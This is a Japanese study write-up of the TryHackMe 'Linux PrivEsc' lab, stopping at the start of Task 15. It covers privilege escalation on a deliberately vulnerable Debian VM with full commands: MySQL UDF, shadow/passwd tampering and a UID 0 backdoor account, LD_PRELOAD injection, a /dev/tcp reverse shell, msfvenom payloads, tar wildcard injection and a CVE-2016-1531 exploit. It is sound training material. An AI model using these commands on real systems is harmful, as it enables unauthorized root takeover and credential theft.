# TryHackMe: Linux PrivEsc

> **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
> **学習日:** 2026-05-24 〜
> **進捗:** Task 1〜16 完了（76%）
> **初期認証情報:** `user:password321`（SSH接続可）

---

## ルーム概要

意図的に脆弱な設定にされたDebian VMを使い、Linuxの権限昇格（Privilege Escalation）の手法を実践する。  
一般ユーザー（`user`）として侵入し、`root` 権限を奪取するさまざまな経路を体験する。

---

## タスク一覧

| Task | タイトル | カテゴリ |
|------|---------|---------|
| Task 1 | Deploy the Vulnerable Debian VM | 環境構築 |
| Task 2 | Service Exploits | サービス脆弱性 |
| Task 3 | Weak File Permissions - Readable /etc/shadow | ファイルパーミッション |
| Task 4 | Weak File Permissions - Writable /etc/shadow | ファイルパーミッション |
| Task 5 | Weak File Permissions - Writable /etc/passwd | ファイルパーミッション |
| Task 6 | Sudo - Shell Escape Sequences | sudo悪用 |
| Task 7 | Sudo - Environment Variables | sudo悪用 |
| Task 8 | Cron Jobs - File Permissions | cronジョブ悪用 |
| Task 9 | Cron Jobs - PATH Environment Variable | cronジョブ悪用 |
| Task 10 | Cron Jobs - Wildcards | cronジョブ悪用 |
| Task 11 | SUID / SGID Executables - Known Exploits | SUID/SGID悪用 |
| Task 12 | SUID / SGID Executables - Shared Object Injection | SUID/SGID悪用 |
| Task 13 | SUID / SGID Executables - Environment Variables | SUID/SGID悪用 |
| Task 14 | SUID / SGID Executables - Abusing Shell Features (#1) | SUID/SGID悪用 |
| Task 15 | SUID / SGID Executables - Abusing Shell Features (#2) | SUID/SGID悪用 |
| Task 16 | Passwords & Keys - History Files | パスワード・鍵 |
| Task 17 | Passwords & Keys - Config Files | パスワード・鍵 |
| Task 18 | Passwords & Keys - SSH Keys | パスワード・鍵 |
| Task 19 | NFS | NFS悪用 |
| Task 20 | Kernel Exploits | カーネル脆弱性 |
| Task 21 | Privilege Escalation Scripts | 自動化ツール |

---

## 事前知識メモ

### 権限昇格とは

- 一般ユーザー権限でシステムに侵入後、設定ミスや脆弱性を利用して `root` 権限を奪取すること
- 「侵入」の次のステップとして必須の技術

### 主な権限昇格の経路（このルームで扱うもの）

| 手法 | 概要 |
|-----|------|
| **ファイルパーミッション不備** | `/etc/shadow`（パスワードハッシュ）や `/etc/passwd` が一般ユーザーに読み書きされている |
| **sudo 設定ミス** | `sudo -l` で確認できる許可コマンドを悪用してシェルエスケープ |
| **Cron ジョブ** | root 実行の定期ジョブが書き換え可能なスクリプトを呼んでいる |
| **SUID/SGID ビット** | root 所有でSUIDが付いた実行ファイルを悪用 |
| **パスワードの平文保存** | シェル履歴・設定ファイル・SSH秘密鍵の漏洩 |
| **NFS の no_root_squash** | NFS マウントに root として書き込みができてしまう設定 |
| **カーネルエクスプロイト** | カーネルバージョンの既知脆弱性を使ったroot奪取 |

---

---

## Task 1: Deploy the Vulnerable Debian VM

SSH でターゲットに接続して開始する。

```bash
ssh user@<ターゲットIP>
# パスワード: password321
```

接続後、`id` コマンドで現在の権限を確認する。

```
uid=1000(user) gid=1000(user) groups=1000(user),...
```

---

## Task 2: Service Exploits

### 概要

root 権限で動作しているMySQLサービスに**パスワードなし**でログインできる設定ミスを悪用する。  
MySQL の User Defined Function（UDF）機能を使ってOSコマンドをroot権限で実行させ、SUIDバックドアを作成する。

### 仕組み（攻撃の本質）

「最小権限の原則」の崩壊。不要に高い権限を持つサービス（MySQL as root）が一つでも存在すれば、それがシステム全体への侵入経路になる。

### 手順

```bash
# 1. 攻撃コード（C言語）を共有ライブラリにコンパイル
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 2. MySQLにrootとして接続（パスワードなし）
mysql -u root
```

```sql
-- 3. .soファイルをMySQLプラグインディレクトリへ配置し、UDFを登録
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

-- 4. root権限でSUID付きbashバックドアを作成
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
```

```bash
# 5. バックドアを実行してroot権限を取得
/tmp/rootbash -p
# プロンプトが rootbash-4.1# に変わればroot権限取得成功

# 6. 後処理（次のタスクに進む前に必ず削除）
rm /tmp/rootbash
exit
```

---

## Task 3: Weak File Permissions - Readable /etc/shadow

### 概要

`/etc/shadow`（パスワードハッシュファイル）が world-readable になっている設定ミスを悪用する。  
ハッシュを盗み出し、**攻撃マシン（AttackBox）側で**オフラインクラックする。

### 仕組み（攻撃の本質）

ターゲットに負荷をかけず、アラートも鳴らさずにパスワードを複製する**ステルス攻撃**。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行
ls -l /etc/shadow          # world-readableを確認
cat /etc/shadow            # ハッシュを確認
```

```
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:...
```

```bash
# 攻撃マシン（AttackBox: root@ip-...）上で実行
echo "root:\$6\$Tb/euwmK\$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 結果

| 項目 | 値 |
|-----|---|
| rootのパスワードハッシュ | `$6$Tb/euwmK$OXA.dwMeOAco...` |
| ハッシュアルゴリズム | `sha512crypt`（`$6$` プレフィックスが目印） |
| クラックされたパスワード | `password123` |

```bash
# ターゲットマシン上でrootに昇格
su root
# パスワード: password123
```

### 重要：攻撃マシンとターゲットマシンの使い分け

| 作業 | 実行場所 |
|-----|---------|
| `/etc/shadow` の確認 | ターゲットマシン（`user@debian`） |
| john でのクラック | **攻撃マシン（AttackBox）** |
| `su root` でのログイン | ターゲットマシン |

john はターゲットにはインストールされていない。`/tmp/rootbash -p` で root になっても、その root はまだターゲットマシンの内部にいるだけで攻撃マシンではない。

---

## Task 4: Weak File Permissions - Writable /etc/shadow

### 概要

`/etc/shadow` が world-writable になっている設定ミスを悪用する。  
元のハッシュを**直接上書き**してrootパスワードを自分のものに書き換える。

### 仕組み（攻撃の本質）

Task 3（読み取り→解析）が「合鍵を作る」攻撃なら、Task 4は「錠前ごと付け替える」破壊的な攻撃。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# 1. world-writableを確認
ls -l /etc/shadow
# -rw-r--rw- 1 root shadow ... /etc/shadow

# 2. 新しいパスワードハッシュを生成
mkpasswd -m sha-512 hacked123
# 出力例: $6$WbEOGIRta$6eBBsP/...

# 3. /etc/shadowを編集してrootのハッシュを上書き
nano /etc/shadow
# root: の直後のハッシュ部分を上記の出力に置き換える
# Ctrl+O → Enter で保存、Ctrl+X で終了

# 4. 新しいパスワードでrootに昇格
su root
# パスワード: hacked123
```

### 実戦での禁忌

Task 4の手法は**実際のペネトレーションテストでは絶対に使ってはいけない**。

| リスク | 理由 |
|-------|------|
| 即時検知 | 本物の管理者がログイン不能になった瞬間にインシデント発生 |
| 復元不能 | 元のパスワードを知らないためテスト後にシステムを元に戻せない |
| 破壊行為 | ペネトレーションテストの目的は「破壊」ではなく「リスクの証明」 |

CTFラボだから許される手法。手法を知ることと、いつ使うかを判断できることは別次元。

---

## Task 5: Weak File Permissions - Writable /etc/passwd

### 概要

`/etc/passwd` が world-writable になっている設定ミスを悪用する。  
`/etc/shadow` ではなく `/etc/passwd` 自体にパスワードハッシュを直接書き込み、認証を掌握する。

### 仕組み（攻撃の本質）

現代のLinuxでは、パスワードハッシュは `/etc/shadow` に隔離されている。`/etc/passwd` のパスワードフィールドには通常 `x` が入っており、これはシステムへの指示標識だ—「パスワードの検証は `/etc/shadow` を参照せよ」という意味。

この `x` を削除して**パスワードハッシュを直接書き込む**と、システムはレガシーな動作にフォールバックし、`/etc/shadow` を無視して `/etc/passwd` のハッシュで認証を通してしまう。

### /etc/passwd のフィールド構造

```
ユーザー名:パスワードフィールド:UID:GID:コメント:ホームディレクトリ:シェル
root:x:0:0:root:/root:/bin/bash
```

**UID 0 = 神（root）**。システムはユーザー名ではなくUIDで権限を判断する。名前が `newroot` でも `nobody` でも、UID が 0 なら完全なroot権限を持つ。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# 1. world-writableを確認
ls -l /etc/passwd
# -rw-r--rw- 1 root root ... /etc/passwd

# 2. openssl でパスワードハッシュを生成（DES形式、短い文字列が出力される）
openssl passwd <任意のパスワード>
# 出力: <生成されたハッシュ>（必ずコピー）

# 3. /etc/passwd の末尾に新規ユーザーを追記
nano /etc/passwd
```

```
# ファイル末尾に以下を追記（[ハッシュ] は Step 2 の出力に置き換え）
newroot:[生成されたハッシュ]:0:0:root:/root:/bin/bash
```

```bash
# 4. 作成したバックドアアカウントでログイン
su newroot
# パスワード: Step 2 で設定したもの

# 5. root権限を確認
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Task 4 との比較：より高度な手法

| 比較軸 | Task 4（shadow上書き） | Task 5（passwd追記） |
|-------|----------------------|---------------------|
| 操作の破壊性 | 既存 root のパスワードを破壊 | 元の root を一切変更しない |
| 管理者への影響 | 管理者が即座にログイン不能 | 管理者は通常通りログイン可能 |
| ステルス性 | 低（即時検知） | 高（気づかれにくい） |
| 実戦での評価 | 三流の手法 | バックドア作成という実践的手法 |

既存の `root` を上書きするのではなく、**UID 0 のクローンを別名で作る**。これが「元のシステムを壊さずに特権アクセスを維持する」というペネトレーションテストの本質的アプローチだ。

### openssl passwd と mkpasswd の違い

| コマンド | アルゴリズム | 用途 |
|---------|------------|------|
| `openssl passwd` | DES（デフォルト） | `/etc/passwd` への書き込み（レガシー形式） |
| `mkpasswd -m sha-512` | SHA-512 | `/etc/shadow` への書き込み（現代の形式） |

`/etc/passwd` に書き込む場合は `openssl passwd` を使う。`mkpasswd` で生成したSHA-512ハッシュでは動作しない。

### 今回の最大の教訓：「自分が今どこにいるか」の確認を怠るな

このTaskで陥りやすいミス：AttackBox（自分の攻撃マシン）上で `/etc/passwd` を編集してしまう。

| 確認ポイント | ターゲットマシン | AttackBox（攻撃マシン） |
|------------|---------------|----------------------|
| プロンプト表記 | `user@debian:~$` | `root@ip-XX-XX-XX-XX:~#` |
| `/etc/passwd` の権限 | `-rw-r--rw-`（world-writable = 脆弱） | `-rw-r--r--`（通常状態） |
| この手法が「脆弱性の悪用」になる条件 | 一般ユーザーとして実行している | すでにrootなので脆弱性でも何でもない |

**AttackBox上で作業していた場合の見分け方：**
1. `ls -l /etc/passwd` の出力が `-rw-r--r--`（world-writableでない）
2. プロンプトに `root@ip-` が含まれている
3. `id` で最初から `uid=0(root)` が返ってくる

この状態で「成功した」と思うのは自己欺瞞。必ずターゲットマシンに SSH で入り直してから作業すること。

---

## Task 6: Sudo - Shell Escape Sequences

### 概要

`sudo -l` で一般ユーザーがsudo経由で実行できるプログラムを列挙し、GTFOBinsでシェルエスケープシーケンスを調べてroot権限を奪取する。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# sudo で実行可能なプログラムを列挙
sudo -l
# → 複数のプログラムがリストされる（vin, nano, awk, find など）
```

GTFOBins（https://gtfobins.github.io）でリストされた各プログラムを検索し、"sudo" 機能のエントリがあるものはシェルエスケープが可能。

**シェルエスケープの例（find の場合）:**

```bash
sudo find . -exec /bin/sh \; -quit
# → rootシェルが起動する
```

作業が終わったら必ず `exit` で一般ユーザーに戻る。

### apache2 のケース：GTFOBins に載っていないプログラムの悪用

リストの中で **apache2 だけ** は GTFOBins にシェルエスケープシーケンスが掲載されていない。しかし、載っていない = 安全ではない。

#### アプローチ1：設定ファイル解析エラーを使ったファイル読み取り

```bash
sudo apache2 -f /etc/shadow
```

Apacheはroot権限で `/etc/shadow` を読み込もうとするが、中身がApache設定構文ではないため構文エラーを吐く。その際、**ファイルの内容（パスワードハッシュ）をエラーメッセージとして出力してしまう**。シェルは取れなくても情報窃取が成立する。

#### アプローチ2：悪意ある共有ライブラリのモジュール注入

Apacheは `LoadModule` で外部 `.so` ファイルを動的ロードできる仕様を持つ。この仕様を利用し、「ロードされた瞬間にroot権限でバックドアを作成するC言語コード」を `.so` にコンパイルし、ダミー設定ファイルで読み込ませる手法。Task 7 の LD_LIBRARY_PATH 悪用と本質的に同じ発想。

### 教訓

GTFOBinsはチートシートであって、「載っていないから安全」という意味ではない。「このバイナリはOS上でどういう権限と機能を持っているか」を論理的に分解すれば突破口は見える。

---

## Task 7: Sudo - Environment Variables

### 概要

`sudo` は特定の環境変数をユーザーの環境から引き継ぐよう設定できる。  
`LD_PRELOAD` と `LD_LIBRARY_PATH` を引き継ぐ設定ミスを悪用し、プログラムのプロセス空間に悪意ある共有ライブラリを注入してroot権限を奪取する。

### 仕組み（攻撃の本質）

通常、`sudo` はセキュリティのためにユーザーの環境変数をすべてリセットする。しかし `sudo -l` で `env_keep+=LD_PRELOAD` や `env_keep+=LD_LIBRARY_PATH` があれば、これらが root 実行時にも引き継がれる致命的な設定ミスだ。

### 手順

```bash
# 設定を確認
sudo -l
# → env_keep += LD_PRELOAD, LD_LIBRARY_PATH が確認できる
```

#### 攻撃1：LD_PRELOAD（VIP横入り攻撃）

LD_PRELOAD は「他のすべてのライブラリより先に指定した .so を強制ロード」する環境変数。

```bash
# 悪意ある共有ライブラリをコンパイル
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

# sudo で任意の許可プログラムを実行しながら偽ライブラリを横入りさせる
sudo LD_PRELOAD=/tmp/preload.so find
# → root シェル（root@debian:/home/user#）が起動する
```

何のプログラムを実行するかは無関係。プログラムより先に `preload.so` がrootとしてロードされるため、その時点でバックドアが発火する。

#### 攻撃2：LD_LIBRARY_PATH（偽の標識攻撃）

LD_LIBRARY_PATH は「共有ライブラリの探索先を指定フォルダに優先させる」環境変数。

```bash
# apache2 の依存ライブラリを調査
ldd /usr/sbin/apache2
# → libcrypt.so.1, libdl.so.2 など多数がリストされる

# 依存ライブラリと同名の偽ライブラリを /tmp に配置
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

# /tmp を優先探索させて apache2 を起動
sudo LD_LIBRARY_PATH=/tmp apache2
# → 偽 libcrypt.so.1 がロードされ root シェルが起動する
```

Apacheが `libcrypt.so.1` を探した際、`/tmp` に同名の偽ライブラリがあるため騙されてロードする。偽ライブラリ内の初期化コード（`__attribute__((constructor))` で定義）が即座に発火し、rootシェルが起動する。

### エクストラチャレンジ：別ライブラリ名に偽装した場合の検証

`libcrypt.so.1` ではなく `libdl.so.2` に名前を変えて同じ攻撃を試みた。

```bash
gcc -o /tmp/libdl.so.2 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
# → root シェルが起動（成功）
```

**なぜ別の名前でも成功したか：**

`libdl.so.2` は `libapr-1.so.0`（Apacheのコア基盤ライブラリ）が起動直後に要求するライブラリだった。`libapr` が最初に `libdl` を探した際に `/tmp` の偽ライブラリを掴んでしまい、`__attribute__((constructor))` が発火してrootシェルが立ち上がった。

**攻撃の成否を分ける条件：**

| 状況 | 成否 |
|-----|-----|
| ターゲットライブラリが「起動直後」に読み込まれる | 成功（constructor が即発火） |
| ターゲットライブラリが「特定機能呼び出し時」の遅延ロード | 失敗（Apacheが通常起動して終わる） |

「どのライブラリなら発火するか」は ldd で依存関係を読み、Apacheのコア処理が最初に引き込むものを狙うのがセオリー。

### 今回の最大の教訓：「現在地（プロセスの階層）」を失うな

LD_PRELOAD で rootシェルに入った後、`exit` せずにそのまま LD_LIBRARY_PATH の検証コマンドを打つと「root の中でさらにrootシェルを重ねる」マトリョーシカ状態になる。  
外見のプロンプトは同じ `root@debian:/home/user#` に見えるが、プロセスは多重にネストしている。検証が狂うため、各攻撃の後は必ず `exit` で一般ユーザー（`user@debian:~$`）まで戻ってから次の攻撃を仕掛けること。

---

## Task 8: Cron Jobs - File Permissions

### 概要

root権限で定期実行されるCronジョブのスクリプトが **world-writable（誰でも書き換え可能）** になっている設定ミスを悪用する。  
スクリプトを「リバースシェル」に書き換え、次のCron発動時にターゲット自身に攻撃者マシンへ接続させて root シェルを奪取する。

### 脆弱性の根源（2つの設定ミスの連鎖）

```
┌─────────────────────────────────────────┐
│              設定ミス①                   │
│  /etc/crontab                           │
│  * * * * * root overwrite.sh   ←毎分    │
│              ↑                          │
│           root権限で自動実行             │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│              設定ミス②                   │
│  /usr/local/bin/overwrite.sh            │
│  -rwxr--rw-  ← world-writable!         │
│                                         │
│  一般ユーザーが内容を書き換え可能        │
└─────────────────────────────────────────┘
```

「毎分 root が実行するスクリプト」を「誰でも書き換えられる」状態に置いている。これが今回の致命的な組み合わせ。

### 攻撃フロー（リバースシェル）

```
【AttackBox】                        【ターゲット Debian VM】
root@ip-ATTACKER                     user@debian
      │                                    │
      │  ① crontab・スクリプト権限を確認    │
      │◄───────────────────────────────────│
      │                                    │
      │  ② overwrite.sh をリバースシェルに書き換え
      │                                    │
      │  ③ nc -nvlp 4444 で待ち受け開始    │
      │  ┌─────────────────┐              │
      │  │ Listening 4444  │              │
      │  └─────────────────┘              │
      │                                    │
      │         ④ Cron が発動（毎分）       │
      │         root が overwrite.sh を実行 │
      │                                    │
      │◄═══════════════════════════════════│
      │    ターゲットから接続が届く！        │
      │   （アウトバウンド通信でFWを突破）   │
      │                                    │
      │  ⑤ root@debian:~# が出現           │
      │     → システム掌握完了             │
```

### なぜリバースシェルがバインドシェルより強いか

| 手法 | 接続方向 | ファイアウォール突破 |
|-----|---------|-----------------|
| **バインドシェル** | 攻撃者 → ターゲット（インバウンド） | 弾かれる（企業FWは外部からの接続を遮断） |
| **リバースシェル** | ターゲット → 攻撃者（アウトバウンド） | 通過する（Web通信と同じ方向のため許可されやすい） |

ターゲット自身に内側から鍵を開けさせ、攻撃者の元へ root シェルを「献上」させる。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# 1. Cronジョブの偵察
cat /etc/crontab
# → * * * * * root overwrite.sh（毎分 root 実行）を確認

# 2. スクリプトの書き込み権限を確認
ls -l /usr/local/bin/overwrite.sh
# → -rwxr--rw-（world-writable）を確認

# 3. スクリプトをリバースシェルに書き換え（IP は AttackBox の IP に変更）
echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
echo 'bash -i >& /dev/tcp/[AttackBoxのIP]/4444 0>&1' >> /usr/local/bin/overwrite.sh
```

```bash
# AttackBox（root@ip-ATTACKER）上で実行

# 4. リスナーを起動して Cron の発動を待つ（最大1分）
nc -nvlp 4444
# → Connection received on [ターゲットIP]...
#    bash: no job control in this shell
#    root@debian:~#  ← rootシェル奪取成功
```

### クリーンアップ（後始末）

奪取後のクリーンアップは必須。バックドアを放置すると以下のリスクがある。

| リスク | 内容 |
|-------|-----|
| 継続的な検知ノイズ | 毎分 AttackBox の IP に不正接続を試み続ける → SOC に即検知 |
| 第三者へのバックドア提供 | world-writable のまま放置すると別の攻撃者がIPを書き換えて横取り可能 |

```bash
# AttackBox 側の netcat セッションで
exit
# → root@ip-ATTACKER に戻る

# ターゲットマシン（user@debian）側でペイロードを消去
echo "" > /usr/local/bin/overwrite.sh
cat /usr/local/bin/overwrite.sh  # 空になったことを確認
```

### まとめ：攻撃フェーズの整理

| フェーズ | 実施内容 |
|---------|---------|
| **偵察** | `/etc/crontab` でCronスケジュールと対象スクリプトを特定 |
| **武器化** | `overwrite.sh` をリバースシェルのペイロードに上書き |
| **待機** | AttackBox で `nc -nvlp 4444` を起動してトリガーを待つ |
| **掌握** | Cron発動 → ターゲットが自発的に接続 → root シェル奪取 |
| **後始末** | セッションを切断し、ペイロードを無力化して痕跡を消去 |

---

## Task 9: Cron Jobs - PATH Environment Variable

### 概要

`/etc/crontab` の `PATH` 変数の先頭に **一般ユーザーのホームディレクトリ** が設定されているミスを悪用する。  
Cronが `overwrite.sh` をフルパスなしで実行するため、同名の偽スクリプトをホームディレクトリに置くだけでシステムを乗っ取れる。

### 仕組み（PATHハイジャック）

```
/etc/crontab の設定:
  PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:...
               ↑
         先頭が /home/user（一般ユーザーが書き込める場所）

  * * * * * root overwrite.sh   ← フルパスなし！
```

Cronが `overwrite.sh` を探す際、PATH を先頭から順に検索する。`/home/user/overwrite.sh` が存在すれば、本来の `/usr/local/bin/overwrite.sh` より先に見つかり、root権限でそちらを実行してしまう。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# 1. PATHとCronジョブを確認
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:...
# * * * * * root overwrite.sh  ← フルパスなし

# 2. 偽の overwrite.sh をホームディレクトリに作成
nano ~/overwrite.sh
```

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```bash
# 3. 実行権限を付与
chmod +x /home/user/overwrite.sh

# 4. Cronが発動するまで最大1分待つ（自動でrootが偽スクリプトを実行）

# 5. 作成されたSUIDバックドアでrootシェルを取得
/tmp/rootbash -p
# rootbash-4.1# → root権限取得成功
```

### クリーンアップ

```bash
# rootshell内で
rm /tmp/rootbash
exit

# user@debian で
rm /home/user/overwrite.sh
```

### Task 8との比較

| 比較軸 | Task 8（ファイル権限） | Task 9（PATH変数） |
|-------|---------------------|------------------|
| 悪用する設定ミス | スクリプトが world-writable | PATHの先頭がユーザー制御下 |
| 攻撃手法 | 既存スクリプトを書き換える | 同名の偽スクリプトを先に置く |
| 元のスクリプト | 破壊される | 無傷のまま（置き換えでなく優先） |
| ステルス性 | 低（既存ファイルが変更される） | 高（元ファイルは一切変わらない） |

---

## Task 10: Cron Jobs - Wildcards

### 概要

Cronのスクリプトが `tar` コマンドを **ワイルドカード（`*`）** 付きで実行していることを悪用する。  
ワイルドカードがファイル名として展開される仕様を逆用し、ファイル名に `tar` のオプション文字列を偽装することでコード実行（リバースシェル）を引き起こす。

### 攻撃フロー

```
【compress.sh の中身】
  tar czf /tmp/backup.tar.gz *   ← * が致命的

【シェルの展開】
  * → /home/user 内の全ファイル名に置換
  ↓
  tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf shell.elf tools ...
                               ↑
                  ファイル名がtarオプションとして誤認される

【結果】
  tar がチェックポイント機能を発動し、
  shell.elf を root 権限で実行 → AttackBox へリバースシェル接続
```

### 手順

```bash
# AttackBox 上で実行

# 1. リバースシェルのELFバイナリを生成（LHOSTは必ず自分のAttackBoxのIP）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[AttackBoxのIP] LPORT=4444 -f elf -o shell.elf

# 2. ターゲットへ転送
scp shell.elf user@[ターゲットIP]:/home/user
```

```bash
# ターゲットマシン（user@debian）上で実行

# 3. 実行権限を付与
chmod +x /home/user/shell.elf

# 4. tar オプションに偽装したファイル名を作成（中身は空でいい）
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

```bash
# AttackBox 上で実行

# 5. リスナーを起動してCronの発動を待つ（最大1分）
nc -nvlp 4444
# → Connection received on [ターゲットIP]...
#    （プロンプトが出なくても接続はできている）

# 6. id コマンドで確認
id
# uid=0(root) gid=0(root) groups=0(root)
```

### クリーンアップ

```bash
# netcat のシェル上で（ターゲットの /home/user/ から削除）
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm "/home/user/--checkpoint-action=exec=shell.elf"
exit
```

### なぜワイルドカードが危険か（展開のタイミング）

```
管理者の意図:
  tar czf backup.tar.gz *
  → "全ファイルをバックアップ"

シェルの実際の挙動:
  1. * を展開して全ファイル名の文字列に置換
  2. その文字列をそのまま tar の引数として渡す
  3. tar は -- から始まる文字列を「オプション」と解釈する

攻撃者が仕込めるもの:
  --checkpoint=1            → 1ファイル処理ごとにチェックポイント
  --checkpoint-action=exec= → チェックポイント時に指定コマンドを実行
```

シェルの展開が「コマンドに引数を渡す前」に行われる仕様が根本原因。ワイルドカードを使う場合は常に `--` で引数の終端を明示するか、ファイル名をクォートする必要がある。

### 今回の失敗と学んだ教訓

| ミス | 原因 | 教訓 |
|-----|------|-----|
| ペイロードが届かない | `LHOST=10.10.10.10`（ダミーIP）のままコピペ | リバースシェルはターゲットが自分のIPに通信する。LHOSTは必ず自分のAttackBox IPに変える |
| プロンプトが出ないのに失敗と判断 | TTYなしのダムシェルはプロンプトを表示しない | 接続が来た後は `id` を打って root であることを確認する |

---

## Task 11: SUID / SGID Executables - Known Exploits

### 概要

SUID/SGIDビットが設定されたバイナリを列挙し、既知の脆弱性（CVE）を持つものを特定して既製のエクスプロイトを適用する。

### SUID とは

SUID（Set owner User ID up on execution）が設定されたプログラムは、**誰が実行してもそのファイルの所有者（root）の権限で動作する**。パスワード変更の `passwd` コマンドが代表例。  
裏を返せば、SUIDが付いた脆弱なバイナリは「常設されたrootへの扉」になりうる。

### 手順

```bash
# SUID/SGIDが設定されたファイルを列挙
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# → /usr/sbin/exim-4.84-3 が SUID(root) で存在することを確認

# 既製のエクスプロイトスクリプトを実行
/home/user/tools/suid/exim/cve-2016-1531.sh
# sh-4.1# → root権限取得
```

### CVE-2016-1531（Exim の脆弱性）の仕組み

Exim 4.84-3 は `perl_startup` 環境変数を実行時にサニタイズ（無害化）せずに読み込んでしまう欠陥がある。エクスプロイトはこの変数に「rootシェルを起動するPerlコード」を仕込み、SUID（root）で動くExim に自分の悪意あるコードを実行させる。

---

## Task 12: SUID / SGID Executables - Shared Object Injection

### 概要

SUID バイナリが**一般ユーザーの書き込み可能なディレクトリ**から共有ライブラリを読み込もうとしている設定ミスを突く。そこに悪意ある `.so` ファイルを配置してrootシェルを起動させる。

### 偵察：strace でライブラリ探索の失敗を発見

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

# → open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT
#              ↑ 一般ユーザーが書き込める場所を探している！
```

`strace` はプログラムがOSに発行するシステムコールを丸裸にするデバッグツール。`ENOENT`（ファイルなし）エラーが探索の急所を示す。

### 手順

```bash
# 1. ライブラリを配置するディレクトリを作成
mkdir /home/user/.config

# 2. rootシェルを起動する悪意ある共有ライブラリをコンパイル
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

# 3. SUID バイナリを再実行（今度は偽ライブラリが読み込まれる）
/usr/local/bin/suid-so
# bash-4.1# → root権限取得
```

### Task 7 との違い

| 比較軸 | Task 7（LD_LIBRARY_PATH） | Task 12（Shared Object Injection） |
|-------|--------------------------|----------------------------------|
| 悪用する仕組み | 環境変数でライブラリ探索経路を捻じ曲げる | バイナリが元から信じ込んでいる絶対パスに偽物を置く |
| 必要な条件 | env_keep でLD_LIBRARY_PATHが引き継がれる設定ミス | 書き込み可能な場所をバイナリが探索している |

---

## Task 13: SUID / SGID Executables - Environment Variables

### 概要

SUID バイナリが内部で**フルパスなし（相対パス）**で外部コマンドを呼び出していることを `strings` で発見し、PATHを汚染して偽のコマンドを実行させる。

### 手順

```bash
# 1. バイナリの内部文字列を確認
strings /usr/local/bin/suid-env
# → "service apache2 start"  ← /usr/sbin/service ではなく相対パス！

# 2. 同名の悪意ある実行ファイルをコンパイル
gcc -o service /home/user/tools/suid/service.c

# 3. カレントディレクトリをPATHの先頭に追加して実行
PATH=.:$PATH /usr/local/bin/suid-env
# root@debian:~# → root権限取得
```

### service.c のポイント：setuid(0) の必要性

```c
int main() {
    setuid(0);           // ← これがないとbashが権限を自動的に落とす
    system("/bin/bash -p");
}
```

現代のbashはSUIDバイナリ経由で呼び出されると「実ユーザー ≠ 実効ユーザー」を検知して権限を一般ユーザーに落とす自己防衛機能を持つ。`setuid(0)` でその防衛を先に無力化する。

### 防御側の視点

外部コマンドを呼び出すプログラムでは、フルパス（`/usr/sbin/service`）を必ずハードコードする。相対パスは攻撃者がPATHを汚染するだけで悪用可能。

---

## Task 14: SUID / SGID Executables - Abusing Shell Features (#1)

### 概要

Task 13 でフルパス指定に修正された `suid-env2` を対象に、**Bash 4.2-048 未満**の「ファイルパスと同名の関数をエクスポートできる」という仕様を悪用して特権昇格する。

### 手順

```bash
# 1. バイナリがフルパスを使っていることを確認
strings /usr/local/bin/suid-env2
# → "/usr/sbin/service apache2 start"  ← フルパス、Task 13 の対策済み

# 2. Bash バージョンを確認（4.2-048 未満であることが条件）
/bin/bash --version
# → GNU bash, version 4.1.5  ← 脆弱なバージョン

# 3. /usr/sbin/service という名前の関数を定義してエクスポート
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# 4. SUID バイナリを実行
/usr/local/bin/suid-env2
# root@debian:~# → root権限取得
```

### 攻撃が成立する仕組み

C言語の `system()` 関数は内部で `/bin/sh -c` を呼び出す。この時起動した Bash が「エクスポートされた関数一覧の中に `/usr/sbin/service` という名前がある」ことを検知し、ファイルより関数を優先実行してしまう。

**教訓：** アプリケーション層のセキュアコーディングが完璧でも、実行環境（Bashのバージョン）の脆弱性一つでシステムが陥落する。視野をコード（点）からシステム全体（面）に広げること。

---

## Task 15: SUID / SGID Executables - Abusing Shell Features (#2)

### 概要

Bash のデバッグモードで使われる環境変数 `PS4` に悪意あるコマンドを埋め込み、SUID バイナリの実行時にそれをroot権限で発火させる。（Bash 4.4 以降では修正済み）

### 手順

```bash
# PS4 にペイロードを仕込んでデバッグモードで SUID バイナリを実行
